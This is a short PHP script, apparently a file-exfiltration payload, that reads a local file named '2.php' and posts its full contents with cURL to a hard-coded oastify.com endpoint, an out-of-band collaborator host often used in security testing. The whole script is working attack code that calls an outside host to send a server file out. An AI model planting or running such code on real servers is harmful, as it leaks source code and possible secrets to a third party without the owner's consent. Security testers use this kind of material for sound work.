<?php
// URL of the endpoint to send the contents to
$endpoint = 'http://6w3w2eyvf1qxkykq61kcccn1lsrjfa3z.oastify.com';

// File path of 2.php
$file = '2.php';

// Read the contents of the file
$contents = file_get_contents($file);

if ($contents === false) {
    // Handle file read error
    echo 'Unable to read file: ' . $file;
} else {
    // Send the contents using cURL
    $curl = curl_init($endpoint);

    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $contents);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($curl);
    $error = curl_error($curl);

    curl_close($curl);

    if ($error) {
        // Handle cURL error
        echo 'cURL error: ' . $error;
    } else {
        // Handle successful response
        echo 'Contents sent successfully!';
    }
}
?>
